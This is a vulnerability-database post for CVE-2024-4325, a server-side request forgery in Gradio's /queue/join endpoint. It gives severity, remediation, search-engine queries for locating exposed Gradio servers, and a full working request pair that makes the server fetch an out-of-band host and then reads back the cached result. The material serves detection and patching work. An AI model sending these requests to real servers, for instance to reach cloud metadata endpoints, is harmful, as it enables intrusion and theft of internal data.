---
layout: "post"
cve_id: "CVE-2024-4325"
title: "Gradio - Server-Side Request Forgery"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-4325.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-4325.yaml"
author: "iamnoooob,pdresearch"
severity: "high"
impact: "Unauthenticated attackers can force the server to make arbitrary requests via SSRF, potentially accessing internal services and cloud metadata endpoints.
"
remediation: "Update Gradio to a version later than 4.21.0 that patches the SSRF vulnerability.
"
reference:
  - "https://github.com/advisories/GHSA-973g-55hp-3frw"
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-4325"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N', 'cvss-score': 8.6, 'cve-id': 'CVE-2024-4325', 'cwe-id': 'CWE-918', 'epss-score': 0.4767, 'epss-percentile': 0.97601, 'cpe': 'cpe:2.3:a:gradio_project:gradio:*:*:*:*:*:python:*:*'}"
metadata: "{'verified': True, 'max-request': 2, 'vendor': 'gradio_project', 'product': 'gradio', 'framework': 'python', 'shodan-query': ['http.html:"__gradio_mode__"', 'http.title:"gradio"'], 'fofa-query': ['body="__gradio_mode__"', 'title="gradio"'], 'google-query': 'intitle:"gradio"'}"
tags:
  - "cve"
  - "cve2024"
  - "gradio"
  - "ssrf"
  - "cloud"
  - "oast"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
A Server-Side Request Forgery (SSRF) vulnerability exists in the gradio-app/gradio version 4.21.0, specifically within the `/queue/join` endpoint and the `save_url_to_cache` function. The vulnerability arises when the `path` value, obtained from the user and expected to be a URL, is used to make an HTTP request without sufficient validation checks. This flaw allows an attacker to send crafted requests that could lead to unauthorized access to the local network or the AWS metadata endpoint, thereby compromising the security of internal servers.


## üåê HTTP Request
```nohighlight
POST /queue/join HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_3; en-ca) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20
Connection: close
Content-Length: 561
Content-Type: application/json
Accept-Encoding: gzip

{
    "data": [
        [
            {
                "meta": {
                    "_type": "gradio.FileData"
                },
                "path": "http://oast.fun",
                "url": "http://127.0.0.1:7860/file=/tmp/gradio/d1be868eeb62e5194df165ccd8becbc5b3ffb299/favicon.ico",
                "orig_name": "favicon.ico",
                "size": 15406,
                "mime_type": "image/x-icon"
            }
        ]
    ],
    "event_data": null,
    "fn_index": 0,
    "trigger_id": 2,
    "session_hash": "l8v6ku4cm8d"
}
```

```nohighlight
GET /file=/tmp/gradio/19406071416d9a0eb25000cdb2f637286100f7b6/oast.fun HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

